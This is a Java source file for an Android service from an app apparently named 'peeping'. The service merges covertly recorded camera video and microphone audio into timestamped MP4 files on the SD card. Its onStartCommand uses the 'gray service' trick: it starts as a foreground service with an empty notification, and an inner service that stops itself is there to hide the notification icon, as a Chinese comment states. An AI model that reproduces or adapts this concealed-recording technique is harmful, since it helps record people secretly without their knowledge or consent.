package com.peeping;

import java.io.File;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.io.IOException;
//import com.coremedia.iso.boxes.Container;
//import com.googlecode.mp4parser.FileDataSourceImpl;
//import com.googlecode.mp4parser.authoring.Movie;
//import com.googlecode.mp4parser.authoring.Track;
//import com.googlecode.mp4parser.authoring.builder.DefaultMp4Builder;
//import com.googlecode.mp4parser.authoring.container.mp4.MovieCreator;
//import com.googlecode.mp4parser.authoring.tracks.AACTrackImpl;
//import com.googlecode.mp4parser.authoring.tracks.h264.H264TrackImpl;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaCodec;
import android.media.MediaExtractor;
import android.media.MediaFormat;
import android.media.MediaMuxer;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;



@TargetApi(Build.VERSION_CODES.JELLY_BEAN) 
@SuppressLint("NewApi") 
public class Synthesis extends Service{

	private final static String TAG = "Synthesis";

	private static final int GRAY_SERVICE_ID = -1;
	
	private int width;
	private int height;
	private int framerate;
		
	
	
	@Override
	public void onCreate() {
		super.onCreate();
		Log.d(TAG, "onCreate");
	}
	
	@SuppressWarnings("deprecation")
	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);
		Log.d(TAG, "onStart");
	}
	
	@Override
	public void onDestroy() {
		super.onDestroy();
		Log.d(TAG, "onDestroy()");
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		Log.e(TAG, "onBind");
		return null;
	}
	
	@Override
	public boolean onUnbind(Intent intent) {
		Log.e(TAG, "onUnbind");
		return super.onUnbind(intent);
	}


	public void muxVideoAudio(String videoPath, String audioPath, String muxPath) {
		try {
			MediaExtractor videoExtractor = new MediaExtractor();
			FileInputStream finvideo = new FileInputStream(new File(videoPath));
			FileDescriptor fdvideo = finvideo.getFD();
			videoExtractor.setDataSource(fdvideo);
			//videoExtractor.setDataSource(videoPath);
			MediaFormat videoFormat = null;
			int videoTrackIndex = -1;
			int videoTrackCount = videoExtractor.getTrackCount();
			for (int i = 0; i < videoTrackCount; i++) {
				videoFormat = videoExtractor.getTrackFormat(i);
				String mimeType = videoFormat.getString(MediaFormat.KEY_MIME);
				if (mimeType.startsWith("video/")) {
					videoTrackIndex = i;
					break;
				}
			}
			

			
			
			MediaExtractor audioExtractor = new MediaExtractor();
			//audioExtractor.setDataSource(audioPath);
			FileInputStream finaudio = new FileInputStream(new File(audioPath));
			FileDescriptor fdaudio = finaudio.getFD();
			audioExtractor.setDataSource(fdaudio);
			
			MediaFormat audioFormat = null;
			int audioTrackIndex = -1;
			int audioTrackCount = audioExtractor.getTrackCount();
			for (int i = 0; i < audioTrackCount; i++) {
				audioFormat = audioExtractor.getTrackFormat(i);
				String mimeType = audioFormat.getString(MediaFormat.KEY_MIME);
				if (mimeType.startsWith("audio/")) {
					audioTrackIndex = i;
					break;
				}
			}
			videoExtractor.selectTrack(videoTrackIndex);
			audioExtractor.selectTrack(audioTrackIndex);
			MediaCodec.BufferInfo videoBufferInfo = new MediaCodec.BufferInfo();
			MediaCodec.BufferInfo audioBufferInfo = new MediaCodec.BufferInfo();
			MediaMuxer mediaMuxer = new MediaMuxer(muxPath, MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4);
			int writeVideoTrackIndex = mediaMuxer.addTrack(videoFormat);
			int writeAudioTrackIndex = mediaMuxer.addTrack(audioFormat);
			mediaMuxer.start();
			ByteBuffer byteBuffer = ByteBuffer.allocate(width * height);
			

			int readVideoSampleSize = videoExtractor.readSampleData(byteBuffer, 0);
			if (videoExtractor.getSampleFlags() == MediaExtractor.SAMPLE_FLAG_SYNC) {
				videoExtractor.advance();
			}
			
			readVideoSampleSize = videoExtractor.readSampleData(byteBuffer, 0);
			long secondTime = videoExtractor.getSampleTime();
			videoExtractor.advance();
			long thirdTime = videoExtractor.getSampleTime();
			long sampleTime = Math.abs(thirdTime - secondTime);
			if (sampleTime == 0) {
				sampleTime = 1000000/this.framerate;
			}
			
			videoExtractor.unselectTrack(videoTrackIndex);
			videoExtractor.selectTrack(videoTrackIndex);
			int videoframecnt = 0;
			while (true) {
				readVideoSampleSize = videoExtractor.readSampleData(byteBuffer, 0);
				if (readVideoSampleSize <= 0) {
					break;
				}
				videoBufferInfo.size = readVideoSampleSize;
				videoBufferInfo.presentationTimeUs += sampleTime;
				videoBufferInfo.offset = 0;
				//noinspection WrongConstant
				videoBufferInfo.flags = MediaCodec.BUFFER_FLAG_SYNC_FRAME;//videoExtractor.getSampleFlags()
				mediaMuxer.writeSampleData(writeVideoTrackIndex, byteBuffer, videoBufferInfo);
				videoExtractor.advance();
				videoframecnt ++;
			}
			Log.e(TAG, "video frame count:" + videoframecnt);
			
			int audioframecnt = 0;
			while (true) {
				int readAudioSampleSize = audioExtractor.readSampleData(byteBuffer, 0);
				if (readAudioSampleSize < 0) {
					break;
				}
				audioBufferInfo.size = readAudioSampleSize;
				audioBufferInfo.presentationTimeUs += sampleTime;
				audioBufferInfo.offset = 0;
				//noinspection WrongConstant
				audioBufferInfo.flags = MediaCodec.BUFFER_FLAG_SYNC_FRAME;// videoExtractor.getSampleFlags()
				mediaMuxer.writeSampleData(writeAudioTrackIndex, byteBuffer, audioBufferInfo);
				audioExtractor.advance();
				audioframecnt ++;
			}
			Log.e(TAG, "audio frame count:" + audioframecnt);
			finaudio.close();
			finvideo.close();
			mediaMuxer.stop();
			mediaMuxer.release();
			mediaMuxer = null;
			videoExtractor.release();
			videoExtractor = null;
			audioExtractor.release();
			audioExtractor = null;
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	
	@SuppressLint("NewApi") public void muxVideoAudio2(String videoPath, String audioPath, String outputFile) {
		try {
			MediaExtractor videoExtractor = new MediaExtractor();
			FileInputStream finvideo = new FileInputStream(new File(videoPath));
			FileDescriptor fdvideo = finvideo.getFD();
			videoExtractor.setDataSource(fdvideo);
			//videoExtractor.setDataSource(videoFilePath);
			MediaExtractor audioExtractor = new MediaExtractor();
			FileInputStream finaudio = new FileInputStream(new File(audioPath));
			FileDescriptor fdaudio = finaudio.getFD();
			audioExtractor.setDataSource(fdaudio);
			//audioExtractor.setDataSource(audioFilePath);
			MediaMuxer muxer = new MediaMuxer(outputFile, MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4);
			videoExtractor.selectTrack(0);
			MediaFormat videoFormat = videoExtractor.getTrackFormat(0);
			int videoTrack = muxer.addTrack(videoFormat);
			audioExtractor.selectTrack(0);
			MediaFormat audioFormat = audioExtractor.getTrackFormat(0);
			int audioTrack = muxer.addTrack(audioFormat);
			//LogUtil.d(TAG, "Video Format " + videoFormat.toString());
			//LogUtil.d(TAG, "Audio Format " + audioFormat.toString());
			boolean sawEOS = false;
			int frameCount = 0;
			int offset = 100;
			int sampleSize = width * height;
			ByteBuffer videoBuf = ByteBuffer.allocate(sampleSize);
			ByteBuffer audioBuf = ByteBuffer.allocate(sampleSize);
			MediaCodec.BufferInfo videoBufferInfo = new MediaCodec.BufferInfo();
			MediaCodec.BufferInfo audioBufferInfo = new MediaCodec.BufferInfo();
			videoExtractor.seekTo(0, MediaExtractor.SEEK_TO_CLOSEST_SYNC);
			audioExtractor.seekTo(0, MediaExtractor.SEEK_TO_CLOSEST_SYNC);
			muxer.start();
			while (!sawEOS) {
				videoBufferInfo.offset = offset;
				videoBufferInfo.size = videoExtractor.readSampleData(videoBuf, offset);
				if (videoBufferInfo.size < 0 || audioBufferInfo.size < 0) {
					sawEOS = true;
					videoBufferInfo.size = 0;
				} else {
					videoBufferInfo.presentationTimeUs = videoExtractor.getSampleTime();
					//noinspection WrongConstant
					videoBufferInfo.flags = videoExtractor.getSampleFlags();
					muxer.writeSampleData(videoTrack, videoBuf, videoBufferInfo);
					videoExtractor.advance();
					frameCount++;
				}
			}
			Log.e(TAG,"video frame count:"+ frameCount);

			boolean sawEOS2 = false;
			int frameCount2 = 0;
			while (!sawEOS2) {
				frameCount2++;
				audioBufferInfo.offset = offset;
				audioBufferInfo.size = audioExtractor.readSampleData(audioBuf, offset);
				if (videoBufferInfo.size < 0 || audioBufferInfo.size < 0) {
					sawEOS2 = true;
					audioBufferInfo.size = 0;
				} else {
					audioBufferInfo.presentationTimeUs = audioExtractor.getSampleTime();
					//noinspection WrongConstant
					audioBufferInfo.flags = audioExtractor.getSampleFlags();
					muxer.writeSampleData(audioTrack, audioBuf, audioBufferInfo);
					audioExtractor.advance();
				}
			}
			
			Log.e(TAG,"audio frame count:"+ frameCount2);
			finaudio.close();
			finvideo.close();
			muxer.stop();
			muxer.release();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	
	
	
	
	public Synthesis(int width,int height,int framerate) {
		
		this.width = width;
		this.height = height;
		this.framerate = framerate;
	    try {

	    	String SDCARDPATH = "";
	    	String LOCAL_PATH_NAME = "";
	    	boolean sdCardExist = Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED);
	    	if(sdCardExist){
	    		SDCARDPATH = Environment.getExternalStorageDirectory().getAbsolutePath();
	        	LOCAL_PATH_NAME = SDCARDPATH + Peeping.LOCAL_FOLDER_NAME;
	    	}else{
	    		Log.e(TAG, "not found sdcard");
	    	}
	    	
	        SimpleDateFormat sdf= new SimpleDateFormat("yyyy_MM_dd_HH_mm_ss",Locale.CHINA);
	        Date date =new Date();
	        String dateformat=sdf.format(date);

	    	muxVideoAudio(LOCAL_PATH_NAME +AvcEncoder.PEEPINGCAMERA_FILENAME,LOCAL_PATH_NAME +AudioRecord.AUDIORECORD_FILENAME,
	    			LOCAL_PATH_NAME + dateformat + ".mp4");
	    	
	    } catch (Exception ex) {
	        ex.printStackTrace();
	    }
	}
	


	
	//在onStartCommand中，因为starId是唯一的，startId默认从1开始，
	//如果Service已经创建了，多次去调用startService来启动Service，则startId呈递增的形式，每次都加1，
	//当startId等于8时，Service内部调用了stopSelf杀掉自身。
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.d(TAG, "onStartCommand");

	    try {
	        if (Build.VERSION.SDK_INT < 18) {
	            startForeground(GRAY_SERVICE_ID, new Notification());//API < 18 此方法能有效隐藏Notification上的图标
	            Log.d(TAG,"Build.VERSION.SDK_INT < 18");
	        } 
	        else {
	        	Context context = getApplicationContext();
	            Intent innerIntent = new Intent(context, GrayInnerService.class);
	            innerIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	            startService(innerIntent);
	            startForeground(GRAY_SERVICE_ID, new Notification());
	            Log.d(TAG,"Build.VERSION.SDK_INT >= 18");
	        }
	    	
	    	String SDCARDPATH = "";
	    	String LOCAL_PATH_NAME = "";
	    	boolean sdCardExist = Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED);
	    	if(sdCardExist){
	    		SDCARDPATH = Environment.getExternalStorageDirectory().getAbsolutePath();
	        	LOCAL_PATH_NAME = SDCARDPATH + Peeping.LOCAL_FOLDER_NAME;
	    	}else{
	    		Log.e(TAG, "not found sdcard");
	    		return super.onStartCommand(intent, flags, startId);
	    	}
	    	
	        SimpleDateFormat sdf= new SimpleDateFormat("yyyy_MM_dd_HH_mm_ss",Locale.CHINA);
	        Date date =new Date();
	        String dateformat=sdf.format(date);

	    	muxVideoAudio(LOCAL_PATH_NAME +AvcEncoder.PEEPINGCAMERA_FILENAME,LOCAL_PATH_NAME +AudioRecord.AUDIORECORD_FILENAME,
	    			LOCAL_PATH_NAME + dateformat + ".mp4");
	    	
	    } catch (Exception ex) {
	        ex.printStackTrace();
	        Log.e(TAG, PublicFunction.getCallStack() + PublicFunction.getExceptionDetail(ex));
	    }
	    return START_NOT_STICKY;
	    
	}
	
	
	
	//must be public static
	public static class GrayInnerService extends Service {
		
	    @Override
	    public void onCreate() {
	    	Log.e("GrayInnerService","onCreate");

	        super.onCreate();
	    }
	    
		@SuppressWarnings("deprecation")
		@Override
		public void onStart(Intent intent, int startId) {
			super.onStart(intent, startId);
			Log.d("GrayInnerService", "onStart");
			//System.out.println("service onstart\r\n");
		}
	
	    @Override
	    public int onStartCommand(Intent intent, int flags, int startId) {
	    	Log.e("GrayInnerService","onStartCommand");
	        startForeground(GRAY_SERVICE_ID, new Notification());
	        //stopForeground(true);
	        stopSelf();
	        return super.onStartCommand(intent, flags, startId);
	    }
	
	    @Override
	    public IBinder onBind(Intent intent) {

	    	Log.e("GrayInnerService","onBind");
	        throw new UnsupportedOperationException("Not yet implemented");
	    }
	
	    @Override
	    public void onDestroy() {

	    	Log.e("GrayInnerService","onDestroy");
	        super.onDestroy();
	    }
	}
	
}


